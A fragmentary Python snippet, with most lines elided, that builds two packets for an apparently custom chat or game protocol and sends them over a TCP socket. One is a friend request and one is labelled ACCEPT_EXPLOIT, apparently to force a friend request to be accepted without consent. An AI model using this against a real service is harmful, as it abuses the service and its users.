...
FRIEND_REQUEST = lambda id: ('410#{gli&&er}' + f'[8254,{id}]##').encode()
ACCEPT_EXPLOIT = lambda id: ('420#{gli&&er}' + f'[8254,{id}]##').encode()
...
def main():
    try:
        ...
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            ...
            sock.sendall(FRIEND_REQUEST(friend_id))
            sock.sendall(ACCEPT_EXPLOIT(friend_id))
